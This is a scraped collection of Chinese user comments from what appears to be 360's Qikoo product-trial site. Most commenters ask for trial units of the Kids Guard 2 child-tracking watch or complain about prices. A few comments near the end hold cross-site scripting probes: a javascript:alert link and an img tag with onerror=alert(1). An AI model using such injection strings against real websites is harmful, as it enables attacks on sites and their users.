嗯嗯，不错，喜欢喜欢，很牛叉！ 
嗯嗯，不错，喜欢喜欢，很牛叉！ 就是太透明了
主要是价格问题     ！！
希望后续购买的耗材不要太贵
2代终于出来了~~~
终于等到了
什么时候可以申请喽 
期待护童神器。
希望不要显示出LOGO让人贩子看不出是带GPS跟踪功能的手表。
什么时候开始呀，好捉急，申请了好几次都没有申请到。
终于等到你，还好我没放弃~
5月10日0点开放申请
好酷的样子   希望我这次能申请成功吧！
终于开始了
终于开始了我喜欢
希望能申请成功…
正是我想要的产品！
这个产品关注好久了，几次内测及论坛活动申请都没成功，期待这次自己能成功，我也好答应两个宝贝女儿准备送他们的礼物快要上市了！
精致，漂亮，实用
请问一下付款了，北京地区多久到货？
期待已久！！
看起来非常不错
即使没法中，我也要买一个啊。好东西。
我想代理云南省地区的儿童卫士一代二代，现在我在做智能家居。
且不说空气中污染物病菌多，你把空气中水给冷凝了那空气是得有多干燥啊
1代试用中，定位效果不好，希望能再试用一下2代，哈哈
SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB SB 2B 2B 2B 2B 2B 2B 2B 2B 2B 2B 2B 2B 2B 2B SB+2B
期待新品。。。
谢谢支持！！
这个是高富帅的东西，屌丝么，就算了
怎么预约呢？ 
跳票N次不知道会不会胎死腹中啊
目前试用一代中期待能再试用二代！
儿童卫士第一代用了的，靠近电池的地方都怪了，定位效果不是蛮好，录音基本不能用，希望儿童卫士2能有所改进。
不要在眼红我了，360我从刚从业到现在娃娃都三岁多了，我支持你你也得支持我的下一代吧，搞不好我下一代接着卖电脑呢，
我要我要我要我要我要
这已经是第三次申请了，希望能被选中!
8900的价格一点性价比都没了
车子真棒！价格也一样～
数量能不能增加，都2代了。每次都没有抢到。360你就发发慈悲让我中一次吧！关注你们很久了，我自己有宝宝的。
想给宝宝试用一个！简单的理由！
太贪心了吧
什么时侯开卖啊？第一代我都没找到哪有卖的。希望出货快点
第一代的时候就没有申请上，希望第二次能中奖。谢谢了。
已预约成功，等待购买~
买彩票中奖了 
已购买了3个，就是不支持我的大V 夏新N820 啊~
期待阿期待
为了孩子，一直在关注这个，还是比较信任360的 
我想说两句 一代都没量产呢 你知道有多少人还在等 有些功夫不能先把一代做好？
一定要中！
一直在关注，一直在等待...相信360， 360度关爱，
对这个儿童卫士非常感兴趣！一直很支持360！宝宝在长大点就可以用了！
为了孩子，一直在关注这个，还是比较信任360的  
为了孩子，一直在关注这个，还是比较信任360的  
期待，希望功能稳定可靠，早日发售！
一直关注，就是没见有卖的，雷声大，雨点小
期待，一直在关注，强烈支持360
8900………………我还是买辆山地车……吧
一直关注。。
如果能增加语音通话功能就更好了,那样就相当于一个简单功能的小手机.
没有最好，只有更好，2代更给力
在哪里能看到价格啊。。
不知道能卖多少钱。。
等了有小一年了。1还没上市，2都试用了。。不管怎么样这次我一定要申请到试用资格。。一定。。。。。。。。。。。。。。。。。。。。。。。。。。。
很想中一个！
360手表等了好久，到现在还没有买到，只能把希望放在这里了，希望好运降临
小朋友要上小学了 正好适合 希望这次能申请到啊
想给宝宝试用一个！看看有没有传说中那么神!
看了好长时间了
发了几次试用报告，一次都没有成功是咱回事呢
要一个谢谢！
希望能申请到啊 ，很想中一个！ 
好想为我的侄子要一个，能买就好了，有了它以后就可以放心到处玩啦！
想给宝宝试用一个！支持奇酷支持360
#360儿童卫士2# 好期待
很想中一个，不中也让我买一个啊！
想要一个，给弟弟用
希望能给宝宝一个惊喜
给俺家宝宝配个：）
想中，中不了，想买，买不着，期待啊……中一个吧
不明觉厉，等看。。。
非常好,想要一个
一直在申请，想给小侄子整一个，他现在刚好是喜欢乱跑的时候……可是就是不行啊
真是想买都买不到，俺家两个小孩都需要呢
希望能申请到，这个对孩子很重要
599RMB
不错，上班，上课用就好，不知道有没有3.5mm耳机孔。。。。。
非常非常期待
希望可以给我马上要上学的宝贝申请上
对呀，第一代都没申请到，希望第二代能尝鲜，要不早点上市买个也行，儿子就快上小学了，希望能申请到。
希望360出静电净化器，这样可以剩下很多耗材。
我给我父亲，小时候我是他的宝，现在他是我的宝
无意中看见，以前就不知道有这个网站啊，刚订的小米盒子一点也不好，看电影老卡
外观比第一版的完美很多。还有如果在手表上方带有一个摄像头那不错，这样能够了解到还能更详细的位置和情况。
望眼欲穿，爱你真的好难……测试申请不到，敬请早日上市吧，请勿学习某些难以接受的抢购营销模式，谢谢！
等着360新产品
望眼欲穿！
好期待。希望能得到一个。
飞利浦有喔
这3D宣传做的太烂！换家CG公司重新设计吧？推荐“水晶石”“丝路”。
我要申请呀！希望能得到
很期待。支持360.
抢位置抢位置 
我家宝贝明天报名幼儿园，希望能尝试，一代都没得到，好希望宝贝开学的时候能送他一个。
这个售价不知道多少大洋？
我们家宝宝马上上幼儿园了，希望可以能送给他一个
支持 ，望眼欲穿的感觉  
嘿嘿。很看好这款哦，看看建议都被才用了吗。
这个太应该有了，孩子马上就要上幼儿园了，有了这个 手环家长放心，老师安心，警察省心，表示很赞 ！希望能得到试用机会！
这个非常好，我们家长都需要！希望加大产能，很难买到的！
很有创意的产品。希望早点上市。
期待....
期待能让我的闺女用上这个手表
这是up的山寨货色吗？0.0
不错的东西，很想给闺女来一个，什么时候发售呢
去掉什么液晶屏，什么智能系统，搞个亲民的价格，走销量，不好么？
说个前几天的事情，我小孩子太好动了，才两岁半看不住，就送去幼儿园了，第一天去报到就全园出名了，原因是还没放学，她借机到教室外玩，跟着一辆车出了校门，到街上乱串，被一熟人领了回来。最近几天我很关注儿童定位器，万分期待这个神奇靠谱的产品。
怎么预约呢？  
希望尝试一下
颜色昵称:活力黄、动感红、蓬勃绿、希望蓝
支持 .好期待。
谢谢您的推荐。
非常期待这个产品！
外观真的丑，不过价格方面让穷孩子接受得了才行
没用、被绑架犯扔了就没用了
哈哈。有创意。
你这个更有 比萨斜塔的味道！赞一个，对，的确是斜的！
怎么预约？
怎么预约？
非常感谢，奇酷提供的这个平台，体验了高科技创新的设备，看了介绍，这个净化器很不错。
价格，我觉得还是有点贵了
我是做孕婴童行业的，关注很久了，如果正常销售就好了，周围很多妈妈需要这类商品，期待偶遇。
相信奇酷网和儿童卫士团队，都会尽快让大家用上最新的儿童卫士的。
中国制造开始往中国设计转型了！加油
预约时间已经过了。。。
期待更好。。。。
这个大概什么时候能出来呀？？&gt;
这个是老外画的，旁边还有一个塔对不？你真行！
不错，很有美感
永远只是有预约,没有祸.
价格，关键是价格，普通老百姓能承受的了吗！！我认为还是有点贵。
真心期待预约成功
期待中——
uv灯不好配 
如何购买？
如何购买？
买一个给自己孩子   自己在外地打工   见不到孩子  知道孩子每天在哪里也好 
怎么预约？ 期待能够拥有
如何购买？
怎么预定？
期待产品发售 
一代都没开放购买，二代都出来了。。。
啥时候有的买啊？
搞什么飞机，发售啊。
产品很人性化，我个人也是做智能可穿戴设备的。这款针对儿童的产品确实很实用，功能也还说得过去，我想如果后续能把儿童的体温和心率能加上去更加好，希望360越来越好！
很人性化的一款产品，针对儿童使用的功能我希望后续能将体温检测和心率检测做上去，因为技能检测小孩的地理位置也能检测自己小孩的身体健康，我觉得这是更加重要的。我个人也是做智能可穿戴设备的，我很看好这款产品，加油！
8900太贵了，本来好好一个平民化的产品定个土豪的价格，概念不错，但销量不看好。
用360儿童卫士，我们放心
一个“儿童安全”功能把360这款产品推向了智能可穿戴设备市场的前列，期待更多的功能开发，更加人性化的功能延伸！
有点贵哦。。。平民买不起。
不错的产品，21世纪，最缺什么？最缺健康！最缺安全感！
哪来的绿啊
比一代漂亮多了，
有没有哪位亲试用完了能有偿转给我的，联系Q957025087
期待产品发售  
作为家长，非常高兴看到这样的安全产品
这样的好产品,希望能试用,期待中！360一如既往的支持
怎么购买啊啊啊啊啊
一个好产品的诞生、凝聚着研发人员的辛劳与汗水。一个很好的试用报告、是对研发人员的最大支持与肯定、我期待儿童卫士试用、希望这次能有机会哦、、
弱弱地问，我没孩子，能给我侄子吗？各种次次申请试用，都pass了。。。这东西在哪买得到？？？？
这是一款非常实用的高科技产品、能引领你的健康之路、希望等到试用的童鞋们认真体验、仔细完成报告、让研发人员更加的知道此产品的不足之处以更好改进、、
价格太贵了，不划算。
399元，早就有的卖了
淘宝上就有的卖了，399元，有点贵呀
我也是，总是觉得儿童卫士，见首不见尾。360玩的是营销噱头。
想要。。。。
现在的空气污染太严重，每家都需要这个 我能说,这东西太好了吗(^o^)/~ O(∩_∩)O
我能说,这东西太好了吗 我期待用这个产品   
哦哦哦哦哦(⊙o⊙)哦
http://www.qikoo.com/item?id=52dde55305c95f5451000000     已经有的卖了哦，真搞不懂可购买和创意中都有这个
一出市场的话估计得买个6-10个。身边那么多妈妈级的人等着呢。再不出来，孩子们都长大了。
特别想要，期待360儿童手环试用！
现在的空气污染太严重，每家都需要这个 我能说,这东西太好了吗(^o^)/~ O(∩_∩)O  
希望有机会使用，会写一份完整试用报告，体现文字的风采  
希望后续购买的耗材不要太贵
看来大家都需要这样棒的环保产品，奇酷，你最酷，生活小惊喜的创造者，顶起！希望自己也有幸能获得试用资格。试用心得届时会及时向大家发布，让奇酷产品在生活中刮起一阵环保、潮流风。
好喜欢   希望能被试用
真是期待啊，希望能够得到试用资格，为宝宝少一分担心。
看来大家都需要这样棒的环保产品，奇酷，你最酷，生活小惊喜的创造者，顶起！希望自己也有幸能获得试用资格。试用心得届时会及时向大家发布，让奇酷产品在生活中刮起一阵环保、潮流风。
看完产品介绍，真的不错！很期待。
希望得到使用，很关注这台净化器，空气确实是第一杀手，每时每刻都在吸入
我好想要个儿童卫士，来保护我的孩子
什么时候可以发售啊
半电动的自行车，还这贵，厉害，哈哈，前景不乐观
这个价格。土豪用用
很不错的手表
我好想要儿童卫士，来保护我的孩子。什么时候可以发售啊 
我想给我家小宝试用一个
不错。值得购买
很酷！性能如何要看使用结果。 
敢快上市吧，
什么时候可以发售啊 
太贵了。。。
太贵了太贵了
电子水墨屏很喜欢，如果再智能点就好了，因为我是属于那种叫不醒的人，可以智能检测床上的人有没有起床，这样可以安心的贪睡了
比一代好看多了，也实用多了，不过看图片，好像有点厚呀~~~~
也可以布置作业，但是如果只是提醒作业的话，而不能详细记录作业的科目数量就不太人性化了，支持图标diy就好了，拍照当图标，哈哈
名字叫 至贱 什么的实在不好听，改叫 酷钉算了
这个上市估计很多妈妈都要买，还有家里有老人的也需要
颜色很酷，功能很诱人。刚才看到一个小朋友戴着，很好！求一个！！！！
可以看电影吗？？ 
很酷.求试用 
360就是瞎扯蛋！前戏已经够长时间了，别糊弄人了  
据说 这个月 开放销售.....  还搞这些干什么?
有生产出来了. 赶紧卖吧.  不用再测试了  ~~~  
外观太丑了360你在想什么啊？
褒义 是乐于此事 不感觉疲劳
逗比...........
看来大家都需要这样棒的环保产品，奇酷，你最酷，生活小惊喜的创造者，顶起！希望自己也有幸能获得试用资格。试用心得届时会及时向大家发布，让奇酷产品在生活中刮起一阵环保、潮流风。 
说你是无知少女吧 你也下过蛋了 热熔胶枪都没见过 还什么有创意，真无聊的东西
建议的广告语中的产品消费者范围太小，容易丧失中年及老年消费者！！
求试用啊！关注很久了
不错！速速测试吧，希望得到啊！
求试用，6，7岁的小男孩最实用！
不要学小米搞什么饥饿营销，直接拿出来卖不行吗？即使有点小问题我们也能理解
很好的净化器，很方便的用手机就可以操控了，家里刚装修，希望能试用这款产品。
咋样购买呀
啊，以后带小孩出门就不怕小孩跟丢了，GPS定位，安全多了
这里预约了，还要去京东抢购，真是够麻烦的。。。。。360也搞起这恶心的皆饥饿营销了
等了好久了 上次就错过了机会，希望这次能够幸运的拿到。
电池续航如何？
有我之幸，无我之命
对360表示愤慨和不满，半年了一款也没出来。申请N次也没中过，郁闷死了！
有这东西直接卖就可以了啊  ~不要饥饿营销啊
第三次申请，希望能中。掏钱买也行，从去年10.30到现在已经半年多了，一款也没出来。急着用，郁闷中-----
诺西皮套电池说白了就是双电池供电，原装电池放入皮套，诺西仿原装电池放入手机。重量和厚度都远超wearGo纸电池手机套。所以各位看官一眼就可以看出来，在新技术运用方面没有可比性：一个是0.3mm厚的纸电池，一个是仿原装电池。至于你所说续航问题，新产品的开发，有一个发展的过程。我们有更高的需要，才是开发者研发的动力。相信更高续航能力的皮套不久会量产的。
物联网的应用啊，没想到已小有所成了
期待啊，次次都参加，都没拿到啊，希望这次数量多点啊，幸运多一点哦
一代的就关注了很久，试用申请也没申请到，如果可以就直接开卖算了，什么价格。。。
等了好久好久了
要不要5000RMB
这和手表看着很喜欢，价格不知道怎么样、、、
看起来还是蛮不错的，什么时候可以正式推出啊。
一点也不亲民
幸运降临，让手环砸我吧！
又是你的照片 你又中了
设计的挺酷的，又能健身真心不错。价格再亲民点就更好了！
感觉难到手啊
哈哈，必须的！毕竟是做3D打印行业的啦。谢谢支持
太让人期待！GOD  BLESS ME!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
来砸我吧，上一次就没砸到 这次给我一个机会吧
幸运降临，让手环砸我吧！
我在网络上等你，赶紧来吧！
挺精致的，是可通话平板电脑的福音哦！
。。期待。。期待
好产品大家都喜欢，期待中
冬天时可以选用热风，夏天可以选用用冷风，是人性化哦！不错呢！负离子将水分子碎化！有点意思！期待30秒的实际效果！
360在儿童卫士的推广上，是最没有诚意的！
办公室的久坐族也需要哦，有几个哥们坐姿不良腰间盘了！
这个相当不错呀
现在的太需要安全感了，环境检测相关的智能硬件市场广阔哦！
我比较喜欢
还不错吧，虽然很遗憾
感觉比较遗憾呀
东西不错，加入科技厚很方便了
支持！360
要想融洽中国市场还需努力哦，光二氧化碳还是不够的。咱们更关心PM2.5浓度数值！
好东西，值得拥有！
沙滩、阳光、美女还有防晒神器！不错哦！大爱的发明！
期待早日上市，确实太实用了，我们家的孩子马上就三岁了，正是到处跑的时候。
看起来挺人性化的，不知道售价会不会亲民
一代就关注和申请过了，没申请到，希望2代能申请到，家里有小孩，感觉儿童卫士很实用，一代的价格就很亲民，希望2代继续发扬吧
抓紧开卖吧！孩子现在光乱跑！
我去 ￥8900！
尼玛，最主要的是防盗功能。
裤丁也不咋样
非常有创意
一直未成功，一直在申请！
真贵啊。。。     
 怎样购买啊。不能点啊，谁能帮帮我
表示严重期待！
好期待啊啊
很酷！性能如何要看使用结果
功能丰富，作为商务款还是不错的！
绝对的拍照神器！挺喜欢WP手机的，绝对的流畅哦！
怎么购买啊,给个教程吧
独具一格哦，大爱的产品！
再配个摄像头吧，你懂得!
够专业的设备哦，貌似不可能亲民啊
预约后还要多多久啊？
期待，抓紧时间啊
希望得到最好的，给孩子无微不至的关怀，就来这里吧！一直就在家期待着！
一直想让儿子佩戴防丢产品，可看了市面上的类似产品都不满意，唯独360的设计及内容很中意。
不错的配饰哦，很适合女性啊，男性可以搞个表带什么的
1代没赶上！这次希望能申请上！毕竟孩子上幼儿园了！还是很要这项功能的手表的！
二代了，功能更全面，更漂亮了
还行，就是这个价格，还是用毛巾吧
单纯用这个意义不大，净化才是关键
一次没中过，好喜欢你们的产品，更喜欢你们，让我中一次吧。。
颜色昵称:活力黄、动感红、蓬勃绿、希望蓝 @360儿童卫士 @周鸿袆
怎么预约啊
好想给儿子买一个！
搭配上空气净化功能就完美了
看着描述的功能确实让人很期待。360确实很会做产品啊。抓住了父母们的心。一直使用360.值得信赖。
价格是个大问题！！！
手机遥控功能非常实用。
去求。啊。什么玩意。。
在哪能买到啊啊啊啊啊啊啊 
众筹的计划5月底开始发货：）最新消息可以来我们QQ群：372432090
我去 ￥8900！ ？你厂子得倒闭
还不错 正在进行按键寿命测试 现已经测试300多下了 看看能否检查更久
给女儿准备一个！
很期待啊！！！ 
不错，希望中一个
式样可以。就不知133可不可以用。
下一期的试用，期待啊
孩子快出生了，还有1个半月，希望可以得到这款 T3空气卫士
25875
预约是预定的意思懂不楼下！！！！！鸡商啊
好东西………………………………呵呵
快点上市吧～久等了………………
赞！快人一步的360随身带路由器………………………………
真的赞………………………………
360手机壳～真的赞…………
期待有一个
3900还可以考虑
赶紧出啊，快点，一定要给宝宝买一个。
价格还是贵  实惠才是王道
看着还不错
very good!
这是我最期待的产品，没想到这么快就出二代了！
奢华的商品，平民不会考虑！
让爱一路随行 
家长放心的保障
这个不错！  一代感觉定位上还是有一些问题，而且样子也不是特别适用 ！
什么时候能利用360wifi加手机app让手机变成鼠标键盘啊！！我好期待啊！
期待中....能放开卖就好啦
我付款成功了，是在哪里看得到咧？看着还不错
不错 价格合适
外观很酷，希望可以得到这款产品
抓紧时间啊 
已经期待许久了，参加了n个活动也不曾得到试用，希望这次好运。希望赶紧出售啊，而且不要饥饿销售才好啊。
希望可以让我试用 我已经五连败了 呜呜呜
2-3千还能考虑。
期待早点儿出来。开买吧！！价格低一点就好了！！！！
绝赞的想法，绝赞的创意，值得拥有。就是价格略高
估计有点难，还是试一试，说不定能拿到个给小家伙用。
挺好的，不过太贵了         
观很酷，希望可以得到这款产品 ,,
支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产支持国产       真心喜欢  
相当不错，有宝宝的家庭必备产品！
什么时候可以申请？
看着这个整体应该是不便宜啊
求一个！9月就开学了
感觉好炫的样子，不知道用起来什么感觉，还有它的音色如何，十分期待它的出现！！
为了健康，希望可以得到这款产品
千金马上要上一年级了，看来还真的用的上，求一个给我试用，感谢！
这个东东可以有，能千里了解宝贝的动向，放心！好东东！期待感受。
外观设计不错，效果不知道，希望可以得到试用一下。
一直在期待这个产品！真的希望可以得到。让家人放心！
直接买不上嘛 
感觉漂亮了许多，希望试用快来吧
宝宝一个人在外面不放心啊，求一个给宝宝单保镖，家长好放心啊！
看着很漂亮
价格偏高啊
真·识货。。。你咋造的呢。。。。
MB,劳资申请N次不成功，就多了你这个败类！ 没手机申请个毛线
期待就像看着天上星星
还不如买部托雷摩托加点
这个看样子要好几千吧 
终于见到漂亮的宝贝了，等待中
这次一定得申请个试用的，都关注大半年了，还没看见真机
嘿嘿 这个有意思啊
真好那好吗？试目拟待
太好啊！决心要买到手!
360加油！qikoo加油！
支持，顶一个 
价格是硬伤啊~~平民表示用不起
360加油不错效果也一定很好
蓝方设计这款车要赔的前兆啊，价格那么高，牌子又不是世界知名品牌，真是穷人用不起，富人不爱用，中间阶层直接就开汽车了，谁还要你这个车啊，价格定位错误了，现在奇瑞QQ才多少钱啊，大哥.
哈，用来大保龄，肯定赢。哇哈哈。 
直接说多少钱，我预定一个
不知道净化器多少钱，滤纸多少钱一张啊
这种设计就刹车这一点就知道是一台烂车子
好想买一个.
环保没得说，价格绝对是要碰壁的！
创意的感觉不错
我迫不及待的想要啦 
好想给两个女儿一人一个 
中用不中看
为了健康，希望可以得到这款产品
现在我们都需要
创意不错，首先在外型上比较喜欢，会持续关注的
我也想要这个呢。大爱
不错 不错  家里空气总感觉闷闷的  头晕晕的    有了这款东东特别想试试。
特别想试试
家长该怎么以GPS定位。手表内要插卡吗？
什么时候开售呀 
高仿国外的,外观设计没有别人的好看,不知重量是多少?天朝会允许吗?价格呢
这个好棒啊！！！我也想要一个，就是3000有些贵吧？
祝愿我获得试用资格
好东西,不知在干燥的地方,多少小时才能出一杯水呢? 
腾讯会用360的安全扫描吗?
不带摄像头的啊?可以联网报警吗?
内置物联网手机卡
漂亮，设计实用，省空间，就是太贵
价格是多少? 
既然是便携式的,那就再小点.有温度计大小最合适,可随身携带
还有wifi啊 哈哈
我(ˇˍˇ） 想～要啊
价格高了哦 
想要啊啊啊啊
希望能申请到一个
已经设置好闹钟，到时候直接开抢
争取获得试用资格，一旦获得会交出一份图文并茂的报告！
再加个给蓄电池充电功能就好了 
我能说很好么？？  要是可以找我 598685299 开家 淘   宝  网   店    不知道可以卖不可以  求解 ！！
皇帝的新衣 
编辑不过关,错字连篇
我要～～～
流量计费伤不起
外观设计漂亮,价格伤不起
重量多少?可折叠更巴适
360不负责啊,有些东西早就出了他还在创意中
360智键希望出IOS系统的呢，期待许久360路由希望我能拥有一台，家里2台路由已近不行了现在每晚都在蹭网
信号不是很好呀，放在客厅有盲区
申请试用，
多少钱啊。如在2000元以内就好了
要是能够兼容安卓其它的系统就好了    希望尽快兼容
期待体验--@ 923572746
申请试用，
感觉很炫的样子，求试用！！！1
1、能不能考虑将电池进行便携式隐藏2、车体总体来说有些偏向笨重3、这样的车支腿有点不方便，不太符合传统自行车的骑行习惯4、车轮设计太过臃肿，可以借鉴山地车的车轮。尤其是轮胎。
怎么购买？？？
期待中啊，，，，希望价格不要太高就好
马上的流行产品 必行顶
仿佛看到了未来的生活。。。
什么时候才能开始买到，不然求试用，我有三个小孩啊，360，看来给我啊
但是怎么买呢？
不错的家用产品
WO AI 
我想要   。。。。。。。。。。。。。。。  可不可以  给我一个  。。。。。。。。。。
一直被关注，一直未使用。。。
除了摸起来像块肥皂，没有任何缺点。
已经期待许久了，参加了n个活动也不曾得到试用，希望这次好运。希望赶紧出售啊，而且不要饥饿销售才好啊。 
这个使用的是什么网络？
使用的网络我也很好奇,期待试用,好的话想给孩子卖2个。
朋发介绍说很好，希望以后会喜。
呵呵，很多工具都是想通的因人而异而已：书法家用拖把写字，我们用拖把拖地！我们用喷枪油漆房子，街头艺术家用喷枪来绘制街头涂鸦作品！
一直关注，一直未使用
真的很期待，看了评论很棒哎！！！
希望能获得机会，感受先进。
期待中，肯定会有令我意想不到的事情的。
我也想要。希望能的到 
360安全卫士很好啊 期待路由器是不是也一样啊  微   信  dxzh10203
是不是包邮的？？？
普通键盘也可以，害得我玩飞车时被卡！
有的时候有点反应慢
这需要钱买呀
骗人的根本没有人给发货大家不要上当，我写地址了没给发货
真的很不错，好想马上就拥有一个给孩子戴上！
8900明白吗 
收集客户信息？？？？
期待价位在2000以内！
这东西真不错啊  现在孩子都是宝  有了这个就不怕孩子乱跑了
希望能在奇酷上买一个。
就是！说的没错！
有这么多功能，真得好期待！360好品质，你值得拥有！
老吊了，记录小镇的时光
[img]http://www.qikoo.com/[/img]
&lt;img&gt;http://www.qikoo.com/&lt;/img&gt;
要多少钱呢
这是要开启星球大战的节奏了
外观非常炫，实用性不知道如何
&lt;a href=&quot;javascript:alert(&#039;测试&#039;)&quot;&gt;测试&lt;/a&gt;
&quot;&gt;&lt;/a&gt;&lt;img src=&quot;&quot; onerror=alert(1)&gt;&lt;/img&gt;
洗个衣服得累死啊
挺有创意的，不知实用性如何
这个东西不错的
这东西不错听好的，很实用！希望尽快发布！
后壳取不下来怎么解决
给孩子的手表手机快下岗了，期待有机会来个二代儿童卫士试用！
防丢？越来越先进了
很鸡肋，不环保，有可能耗电量很大
无线充电简单方便，就怕辐射伤不起啊
作为一个孩子！我严重反对。。。我们的自由啊(┬＿┬)
这个挺神奇的  得有空气净化器
尼玛八千九给土豪劣绅设计的么！
真假的？不坑爹？？？
小巧方便，功能也很强大呢
俺也期待一份 等宝宝出生有清新空气 希望是真的 
哇塞，吊爆了！航拍丝带儿！
这款大爱啊，超级想要！！
这样充电是不是会浪费电源呢
好喜欢。能不能中啊
抓紧时间出货，急需一个！！！经常忘记喝水！！！！已经肾结石啦
尼玛，这是给平头百姓用的？我不会相信，定位很高的。
呵呵 要是你真不开的话，连有钱都省了
信号不是很好呀，
果然破5万大关了，见证奇酷辉煌的一次试用哦！
这是什么原理啊？太霸道了吧，喜欢
神话中的法术一样神奇
神奇个屁。利用冷与空气的热。 
360这是在搞神马
什么时候可以买啊？让我想到了柯南的手表，能有一块那样的手表，多好啊！
这个2代造型更适合孩子用，看着好卡通
我是360的忠实粉丝，希望这是不要让粉丝们失望。。
一直关注，不知哪里可买？！一代也想买个，希望孩子安全。
果然破5万大关了，见证奇酷辉煌的一次试用哦！ 
无信用卡，55555555
感觉很炫的样子，求试用！！！
一直在期待这个产品！真的希望可以得到。让家人放心！ 
这次我也申请了.看运气吧.
期待监控卫视版的路由.....
又有人攻击奇酷啊。测试漏洞？
期待中..............
非要5个字么
外形确实不错。这个产品。
我是360的忠实粉丝，希望这是不要让粉丝们失望。
呵呵 好贵  而且一般土豪不会买 老百姓不会买 
体重有没有限制。。谁知道
这个评测写的真是让我开眼了啊，比产品说明书还要详细，可谓是专业级中的专业级啊，佩服
很需要这个好东西，祝愿我能得到试用资格
我是360的忠实粉丝，希望这是不要让粉丝们失望
一直在期待这个产品！真的希望可以得到。让家人放心！  
一直都运气欠佳，希望这次能好运降临
很期待产品本身的强大功能。
什么时候上市啊？
一直在期待这个产品！真的希望可以得到。让家人放心！  
你的瓜，藏不住，这怎么就限制你的自由了？？？ 
城市空气质量需要这样的产品普及了
中国自主研发自己制造
对于一个天天在家工作的人 最喜欢这种东西了 .. 
好像要。。。。。 
期待了好久，希望能试用上看看效果
真心期待了很久了
我好想 要一个 给我 妹妹
没永远的敌人 只有最大的利润！
哇哦，good！好像试一试啊啊
我有皮肤病，希望获得资格...
希望这次的申请能批准
我在用TCL么么哒，360的所有产品我都有用呀。妈妈有鼻咽炎，想申请一个给妈妈用，祝天下母亲母亲节快乐
新家装修中希望能拥有
不知道多少钱
简单，简约，人性化个性化设计，很好！！！
我真的好像试一下啊  这还是我第一次知道这个网站那 
yjuduyy
好厉害的样子……惊呆了、、、
希望在母亲节给妈妈一份满意的礼物。
看说明挺好的，想给孩子买一个
汽车内空气污染还需要专业的公司做全面的治理
我是360的忠实用户，已经申请了好几次试用了都没有通过。5555555
看上去不错，就是我看很费电吧。
期待360儿童卫士2.。。。。
感觉T3好像不错耶，希望能获得试用资格
看介绍很是给力
好东西，值得期待啊
就等着试用了还不开始卖啊
产品看上去很不错，介绍的也不错。就不知道实际效果怎么样，申请了就是一直没有动静。非常期待获得资格啊......
环保，最重要是价位
给宝宝一个，再也不用担心他到处跑了
还以为是多科技的东西呢，不就是热熔枪吗，五金店有的是
体验之后才能评论，不过很期待
什么时候可以拥有？
很想拥有。
急需一个！
喜欢，就是贵
美女加油 0.0~！！
希望幸运能降临在我头上！
越来越先进啊....
我好想有一个  对宝宝一定好
试用个屁，有种给我，来啊
希望能够为家里添一份清新
蛮好看的！就是有点小贵啊
一直关注，不知哪里可买？！一代也想买个，希望孩子安全。 
新家马上装好，我也是做室内设计师的，挺注重这个的，要是能申请上用的好以后还能给客户推荐
看起来很炫啊。
可以测体温吗
知道了360儿童卫士才知道奇酷网。一直都在关注儿童卫士，很想给宝宝一个。套用一句广告“再也不用担心她的行踪了”
防止孩子误食
一直在期待这个产品，从一代到二代，真的希望可以得到，让家人放心！
这个产品的存在非常重要，如今社会太复杂了
这个产品很好，我一定要有一个，太需要了！
很想很想让姐姐的两个小家伙安全。想要一个
儿童节前能上市吗？
给个时间什么时候卖，我太需要了，。
最后的时间啦盼望名单上有我的名字！
好像没什么特色啊 
有创意，不实用
好有趣，可惜木有iPhone
不错不错，锻炼洗衣两不误，而且因为惦记着洗衣服而逼不得已要锻炼身体，克服懒惰，只是不知道洗衣效果怎么样？
生活需要创造，非常好。以后还会有地方改进。东西会越做越好，所有的东西都是改进到先进，这些发明都是中国的希望。多多支持。
期待产品的上市。
智能在哪里？
从一代产品就一直在关注关于儿童安全的问题   现在的社会治好不是很理想  只能依靠我们强大的科技的力量去为家人的安全尽一份力
在哪有卖的   太需要了 
感觉很好的样子，就是不知道用起来是什么感觉！
说实话，这是新发现！一款很实用的产品，做父母的必备宝贝！
真希望能中，我太需要这个家伙了
不错 需要一个
是个神奇的东西，也许可以改变生活！
是成品吗?产品介绍的不是很详细。
对宝宝一定好
实际上，老人也有此需求
作为一个电子产品爱好者，等待这一款上手试玩
这是360服务的延伸，360的关爱无处不在
好想也拥有一架这样的飞机
运动达人，莫非你似传说中的吕汉子
我怎么才能得到它啊
这是360服务的延伸，360的关爱无处不在  
什么时候卖啊~！
好想得到试试。
多少钱，管用吗？
并没有什么新鲜感，或许是介绍的太简陋。反正这样的电动车见多了！
不知道怎们查申请状态.. 
我也想要几个呀，宝宝多呀， 
现在每家每户基本上只有一个孩子，都是宝，需要时刻关注其安全，支持这个产品
如果能打电话就更好了。
我是做房地产的，如果可以得到的话，先使用下，好用的话，可以申请合作，到时候在售楼的时候可以作为礼物送给业主，这是个不错的选择哈哈！！！期待能得到试用！！！
360不但关心你的电脑 更关心你的下一代， 不错 做人做事就应该这样
期待了很久，赶紧进来
@Qikoo奇酷网
全力支持儿童卫士
什么时候能买到啊
北京用户严重需要此装备啊！
好东西，支持先！！！！
家里有宝宝，希望给宝宝一个健康
好是好，就是太贵了！！！这真如小编说的：这种智能折叠电动自行车也只能是有钱人的一种玩物，对于普通消费者来说还比较遥远。
屏幕好大！！！！
这活动怎么搞啊 
呵呵，这样也行？
79.99美元的插座，镀金的吗?
嗯，这个有点意思，基本每家都有几盆花，
好期待呀，关注中
太敏感了。放包里经常压到智键，拍的都是黑色照片。。。。
新家里需要一个，用的好的话很乐意推荐给朋友用这款性价比高的空气净化器~！！
很新奇的东西，做工也不错。按键有时候会没反应，自定义功能很有趣，期待更多360出品的智能周边~
从没试用过，来膜拜一下精华试用大神，好专业的拍照啊！平时一定是经常评测吧？
关键是什么时候可以开放购买啊！期待……
你说了算吗？
迫切需要呀！！！！！！
迫切需要啊，参加了360儿童手环的所有活动，结果毛都没有一个，想买也买不到啊。
好东西！！！
感觉功能比小叮当多太多了，适用范围也过阔的多
愿更多的空气、自来水净化器走进千万家庭。
期待试用有好的效果，推荐给宝宝家长，让更多宝宝身体健康是我的期盼
肥皂肥皂肥皂肥皂肥皂肥皂肥皂肥皂肥皂肥皂肥皂肥皂肥皂肥皂
 一切为小孩
